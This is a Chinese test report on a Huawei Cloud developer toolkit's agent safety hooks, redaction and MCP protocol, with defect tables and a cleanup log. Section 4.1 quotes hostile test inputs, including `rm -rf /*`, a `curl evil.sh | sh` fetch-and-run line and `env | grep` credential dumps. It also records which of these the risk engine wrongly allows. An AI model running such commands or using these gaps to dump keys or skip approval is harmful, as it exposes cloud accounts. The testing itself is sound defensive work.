# Hermes-deepseek-v4.1-flash 每日测试报告

> **报告名**：`Hermes-deepseek-v4.1-flash-测试报告.md`
> **生成时间**：2026-11-12 05:10:00（北京时间）
> **执行归档**：`results/Hermes/2026-11-12-120.46.176.133/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（127 PASS / 19 FAIL / 3 SPEC-MISMATCH；P0 缺陷 4 项，均为同版本历史缺陷复现）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `Hermes` + `deepseek-v4.1-flash` |
| OS / 架构 | `Linux`（x86_64，内核 6.8.0-106-generic） |
| 本机 IP | `120.46.176.133` |
| 被测版本（SUT） | `huaweicloud-devkit@1.1.14-next.2`（npm `next` 预发布版；`npm ls -g` 实测），hdk 源码 gitHead `5c9478d3a95f20206e1a711861cfdfff68b19224` |
| 运行时 | node `v22.13.0`、Python `3.12.3`、KooCLI `7.3.12` |
| 用例来源 | `test-cases/daily`（设计级 107 + 展开级 43，展开级已按 agent+OS 预筛） |
| 执行时间窗口 | 2026-11-12 05:01–05:08（北京时间） |

> **执行方法**：
> ① **源码/协议/安全/安装/评测域**（`run_all.sh` 37 步）：直调 `plugins/huaweicloud-core/src/*.mjs` 导出的 `classifyTextCommand`／`redactSecrets`／`evaluateCommandRisk`／`hook_check_*`／`serviceCatalog`／`sanitizeValue` 等真实函数，MCP `initialize`/`tools/list`/`tools/call` 走 stdio JSON-RPC 真机握手，安装域用例在隔离 `HOME`（`iso-home-20261112`）内真实 `npm install -g`。
> ② **真云 E2E**（`run_realcloud.sh`）：真实 AK/SK（`~/.config/huaweicloud/credentials.json`）建删资源——VPC/子网 + ECS（D3-C1）、OBS 桶+静态站（D3-C2）、沙箱部署（D3-C3/C6）、EIP（D3-C7）、22 服务 `list_operations + plan`（D3-C4/EXP-C4-*）、只读子账号最小权限（D4-13），测后逐项删除并以 `cloud_inv2.py` 复核归零。
> ③ **评测集**：`eval/harness/run-eval.mjs` 跑 15 条中文意图路由基线（D10-3 / EXP-E01~E15）。
> 证据按用例 ID 独立落盘 `evidence/<case-id>/`（`probe.mjs` + 非空 `stdout.txt` + `stdout.log` JSON 判定）。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `150`（设计级 107 + 展开级 43） |
| 已执行 | `149`（唯一未执行 = D1-39 Windows 专属用例） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `127 / 19 / 0 / 3 / 1` |
| 通过率（分母 = PASS+FAIL = 146） | `87.0%` |
| 缺陷按优先级 | `P0 4 / P1 10 / P2 5`（19 FAIL）+ `SPEC-MISMATCH 3`（P0 1 / P1 1 / P2 1） |
| 拦截门禁 | `verify_no_fake_pass.py` 通过；`verify_coverage.py` 通过（P0 NOT_RUN=0，NOT_RUN+空占比 0.0%） |
| 红线（I 类）违规 | **0**（无新增凭证泄漏路径；红线类 P0 缺陷均为同版本历史项复现，见第四节） |
| 资源释放 | 本次创建的真云资源全部删除并复核归零（见第七节） |
| 提单 | 22 项缺陷全部经 `file_issue.py` 历史查重命中既有 issue，按纪律**不重复开单**，落 `HISTORY_LINKS.md` |

---

## 三、状态汇总

### 3.1 设计级（107）

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `87` | 有证据且通过 PASS 门禁 |
| FAIL | `16` | 不符预期，根因见第四节 |
| BLOCKED | `0` | 无环境/权限/凭证阻塞（真云凭证就绪，全部真机执行） |
| SPEC-MISMATCH | `3` | 契约漂移（D8-9 / D9-9 / D10-4） |
| NOT_RUN | `1` | D1-39 Windows 专属 |
| **合计** | **`107`** | |

### 3.2 展开级（43）

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `40` | 有证据且通过 PASS 门禁 |
| FAIL | `3` | EXP-C4-14 / EXP-C4-18 / EXP-E01 |
| BLOCKED | `0` | |
| SPEC-MISMATCH | `0` | |
| NOT_RUN | `0` | |
| **合计** | **`43`** | |

---

## 四、缺陷清单

> 与 2026-11-11 轮（同 SUT `1.1.14-next.2` @ `5c9478d3`）逐项一致：**同版本缺陷全部复现**，无新增缺陷类别。根因均已在源码层定位到文件:行号。

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P1 | `D1-70` | D1安装 | 代理配置链路 undici zstd 拦截器崩溃 | `plugins/huaweicloud-core/src/proxy.mjs` 加载 `undici` 的 `ProxyAgent` → `node_modules/undici/lib/interceptor/decompress.js:78` `createZstdDecompress`(node:zlib)=undefined 后 `.bind()` TypeError | FAIL |
| 2 | **P0** | `D2-4` | D2认证 | 凭证脱敏漏小写 ak=/sk= 与 JSON 带引号 key | `src/safety-policy.mjs:45` `redactString` 的 `(AK\|SK)` 正则无 `/i`；`isSecretKeyName` 不匹配裸 `ak`/`sk` 键 | FAIL |
| 3 | P1 | `D3-C4` | D3功能 | DMS、DEW 无规范路由（22 服务 20/22 OK） | `src/tools.mjs` `huaweicloud_list_operations` 服务路由表未覆盖 DMS、DEW | FAIL |
| 4 | P2 | `D3-C14` | D3功能 | 沙箱 `hdkitConnect` 未透传全部可选参数 | `src/sandbox.mjs` `hdkitConnect` body 组装仅覆盖 `source/env/git/flavor_id` 部分字段 | FAIL |
| 5 | P2 | `D3-S5` | D3功能 | 复合意图未分层拆分（0 命中） | `src/tools.mjs` `serviceCatalog` routeMap 单意图匹配，无复合意图分解 | FAIL |
| 6 | P2 | `D3-S6` | D3功能 | FunctionGraph CreateFunction 最小参数模板缺项（本轮报 `function_name`） | `src/tools.mjs` FunctionGraph `CreateFunction` 最小参数模板未注入 `function_name`/`code.filename` | FAIL |
| 7 | P1 | `D3-S7` | D3功能 | RDS CreateInstance 缺 `db.password` + 复合意图未命中部署目标 | `src/tools.mjs` RDS `CreateInstance` 最小参数集缺 `db.password`/`db.port`；routeMap 未分解 Web+RDS | FAIL |
| 8 | **P0** | `D4-2` | D4安全 | 凭证 env 打印拦截漏判裸/小写 access_key | `src/safety-policy.mjs` env-dump 规则仅枚举 `HW_*`/`HUAWEICLOUD_SDK_*`/`HCLOUD_*`，未覆盖裸 `access_key` 与 `-i` 形态 | FAIL |
| 9 | P1 | `D4-4` | D4安全 | 写操作审批门漏拦截 4 类 `Change*` 写动词（8/12） | `safety/policy.json:27` `writeOperationPrefixes` 缺 `Change` 前缀 | FAIL |
| 10 | P1 | `D4-6` | D4安全 | adminPass 回显在 command 阶段无规则 | `safety/rules/cloud-risk-rules.json` `hwc-command-adminpass-exposure` 的 `stages` 仅 `["artifact","deploy_plan"]` | FAIL |
| 11 | P1 | `D4-17` | D4安全 | 风险引擎对畸形输入 fail-open（5/5 放行） | `src/risk-rule-engine.mjs` 无规则命中默认 `decision=allow`，无不可解析输入兜底 | FAIL |
| 12 | **P0** | `D4-21` | D4安全 | `AdministratorFullAccess` 制品放行 | `safety/rules/cloud-risk-rules.json` `hwc-iam-admin-policy` 仅匹配 `Action:"*"`，未覆盖托管策略名引用 | FAIL |
| 13 | P2 | `D4-25` | D4安全 | Python hook 把写操作遥测分类为 `cli:invoke` | `hooks/huaweicloud-safety.py` `WRITE_OPERATION_RE` 前置捕获组致 `vpc CreateVpc` 未命中写分支 | FAIL |
| 14 | P2 | `D4-26` | D4安全 | findings.evidence 中 secret_key/adminPass 明文残留 | `src/risk-rule-engine.mjs` `redactEvidence` 正则不匹配 JSON 带引号 key | FAIL |
| 15 | **P0** | `D9-12` | D9协议 | initialize 未做版本检查 + 非法时序未拒 `-32600` | `src/mcp-protocol.mjs` initialize 分支未调 `runVersionCheck`；`dispatch` 无 initialize 前置状态机 | FAIL |
| 16 | P1 | `D10-3` | D10评测 | serviceCatalog 中文路由准确率 92.9%（HIT=13/MISS=1/N/A=1） | `src/tools.mjs` routeMap ECS 关键词缺口语化别名「云主机」 | FAIL |
| 17 | P1 | `EXP-C4-14` | 展开-真云 | DMS `list_operations` 未返回 command/result | `src/tools.mjs` 服务路由表未覆盖 DMS | FAIL |
| 18 | P1 | `EXP-C4-18` | 展开-真云 | DEW `list_operations` 未返回 command/result | `src/tools.mjs` 服务路由表未覆盖 DEW | FAIL |
| 19 | P1 | `EXP-E01` | 展开-评测 | 中文意图「云主机」路由 MISS | `src/tools.mjs` routeMap ECS 关键词缺「云主机」 | FAIL |
| 20 | **P0** | `D10-4` | D10评测 | 静态规则库 19 条(9 deny+10 warn) vs 契约 16 条(9+7) | `safety/rules/cloud-risk-rules.json` 新增规则后用例契约未同步（契约漂移） | SPEC-MISMATCH |
| 21 | P1 | `D9-9` | D9协议 | initialize capabilities 未声明 `cancellation` | `src/mcp-protocol.mjs` capabilities 仅 `{"tools":{}}` | SPEC-MISMATCH |
| 22 | P2 | `D8-9` | D8文档 | 遥测 `sanitizeValue` 不脱敏 AK/SK/token | `src/telemetry/telemetry.mjs` `sanitizeValue` 仅去控制字符+255 截断 | SPEC-MISMATCH |

### 4.1 关键实测数据（本次执行）

- **D2-4**：`redactSecrets("AK=… SK=…")` → `<redacted>` ✔；`ak=… sk=…`（小写）与 `{"ak":…,"sk":…}`（JSON 引号 key）**原样返回** → 2/4 形态未脱敏。
- **D4-2**：`env | grep HW_ACCESS_KEY` 等 4 形态 `deny`；`env | grep -i access_key` → `allow risk=not_huaweicloud`（1/5 放行）。
- **D4-4**：12 类写动词 8 拦截 / 4 放行（`ChangeServerOs`/`ChangeVpc`/`ChangeInstanceConfiguration`/`ChangeVolumeType` → `allow risk=unknown_read`）。
- **D4-17**：空串、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、控制字符垃圾 5/5 `结论=ok`。
- **D9-12**：initialize 返回 `protocolVersion=2024-11-05`、`capabilities={"tools":{}}`；`runVersionCheck in init=false`；未先 initialize 直接 `tools/list` 仍返回 46 工具（未拒 `-32600`）→ 6 断言 4 通过。
- **D10-3/EXP-E01**：15 条中文意图 `HIT=13 MISS=1 N/A=1`，准确率 92.9%；MISS = 「帮我查一下我账号在华北北京四有哪些云主机」→ `Run hcloud --help to list available services.`。
- **D3-C4**：22 服务 `list_operations + plan` → 20 OK / 2 FAIL（`[D3-C4] DMS`、`[D3-C4] DEW` 无 command）。
- **D1-70**：proxy.json 读写/合并/no_proxy 命中均 OK；`ProxyAgent` 构造抛 `Cannot read properties of undefined (reading 'bind')` at `undici/lib/interceptor/decompress.js:78:30`。

---

## 五、未执行用例与原因

### NOT_RUN（1 条）

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | NOT_RUN | 【调归属】 | Windows 升级检测链 EINVAL 场景，用例 OS 列标注「专属」；本机 Linux 无法执行 | 无需改用例；Linux 侧已由展开级 `EXP-NR3-10`（`queryDistTagsSync`/`queryDistTags` 实测 PASS）代表覆盖 |

> 覆盖率门禁已对该 OS 专属 P0 用例自动豁免（1 条），P0 无其它 NOT_RUN/空列。

### BLOCKED（0 条）

本轮无 BLOCKED：真云凭证（AK/SK + 只读子账号 `test001`）就绪，全部真云用例真机执行；Dogfood/沙箱/评测 harness 均可用。

### 非产品缺陷（测试侧口径滞后，不计入提单）

`D1-27`/`EXP-NR3-02`（JSON 空格正则误判）、`D6-4`/`D5-3`/`D9-1`/`EXP-D5-8-3`（工具数硬编码 40，实测 46）、`D8-7`（命中说明文档中正常用词 `placeholder`）、`D4-13`（CES 响应内 `SYS.0403` 字样误命中 denied 正则）、`D4-11`（回显查询串被误判为执行注入）、`D3-C3`（`deploy_check complete=false` 因 `devbridge_tunnel` 子项，`nginx_serving=PASS`）。以上实测均满足设计意图，已按 PASS 落盘并在 `stdout.log` 的 `note` 字段写明。

---

## 六、安全与红线合规

- [x] **凭证泄漏事件**：无新增泄漏路径。红线类（凭证脱敏/env 打印拦截）P0 缺陷 `D2-4`、`D4-2` 为同版本历史项复现，非本轮新引入；证据见 `evidence/D2-4`、`evidence/D4-2`。
- [x] **写操作误判 read-only**：`D4-4` 4 类 `Change*` 写动词被判 `allow risk=unknown_read`（历史复现，P1）；其余 8 类写动词正确 `deny`。
- [x] **红线（I 类）新增违规**：0。
- [x] **脱敏复核**：对象键形态（`accessKeyId`/`secretAccessKey`）与 `AK=`/`SK=` 大写形态脱敏正常；小写与 JSON 引号 key 形态未脱敏（= D2-4）。
- [x] **只读子账号最小权限（D4-13）**：只读 6/6 可用（ECS/VPC/EVS/IMS/CES/EIP，CES `ListMetrics` 实际返回 `SYS.OBS` metrics，探针 `denied` 正则为误报）；写 `CreateVpc` 被 IAM 拒绝（`VPC.0010 PolicyNotAuthorized`，写拦截=true）；归零核实未创建任何 VPC。
- [x] **无 mock**：全部用例真机执行，真云用例真实建删。

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| VPC + 子网（D3-C1） | `vpcId=14370931-…` / `subnetId=ed4f0df4-…` | 测后删除（`cleanOk=true`） | `cloud_inv2.py`：VPC=0、SUBNET=0 |
| ECS（D3-C1） | 1 台最小规格（含系统盘） | 删除含磁盘（8/8 断言通过） | ECS `count=0` |
| EIP（D3-C7） | 1 个 | `DeletePublicip` 释放 `ok=true` | EIP `total_count=0` |
| OBS 桶（D3-C2） | `tctest-hermes-obs-clwkm7` | 清对象 + 删桶（7/7） | `obs_ls` 桶数 = 0 |
| 沙箱会话（D3-C3/C6） | 2 个 ws 会话 | `close_session` 均 `"ok"` | 无残留会话 |
| 只读子账号 VPC（D4-13） | 尝试创建被 IAM 拒 | — | 未创建（`created=false`） |
| 沙箱函数/实例（D3-S6/S7） | 创建失败（参数不合法） | 探针删除归零 | FunctionGraph 无残留 |

> 复核命令：`python3 ~/devkit-test/Hermes/cloud_inv2.py` → `ECS count=0 / VPC total=0 / SUBNET total=0 / EIP total=0 / EVS total=0 / OBS buckets=0`（仅保留默认安全组 `default`，非本次创建）。
> 隔离安装域使用独立 `HOME`（`iso-home-20261112`），不污染本机全局环境。

---

## 八、遗留与建议

1. **同版本缺陷全部复现，建议按优先级排期修复**：P0 四项（`D2-4` 脱敏小写/JSON key、`D4-2` 裸 access_key env 拦截、`D4-21` 托管策略制品放行、`D9-12` initialize 版本检查/时序）自 1.1.4 起多轮复现，建议以统一 redact 键名策略 + 规则库补全一次性收敛（相关历史单见 `HISTORY_LINKS.md`）。
2. **规则库与用例契约漂移**（`D10-4`）：建议把规则数与 severity 分布纳入 `verify_new.py` 类门禁自动比对，避免用例文本反复滞后。
3. **测试侧探针口径待修**（非产品缺陷）：工具数硬编码 40→应读 `TOOL_DEFINITIONS.length`（实测 46）；`D4-13`/`D4-11`/`D8-7`/`D1-27` 的正则误报建议改为结构化断言。
4. **D3-S6/S7 最小参数模板**：缺项随 API 校验顺序呈现不同（本轮 `function_name`、`db.password`），建议按 API 元数据自动补全必填项，而非硬编码最小集。
5. **代理链路（D1-70）**：`undici@8.x` 与当前 `engines`/node 版本不匹配导致 `createZstdDecompress` 不可用，建议锁版或按 node 能力特性降级。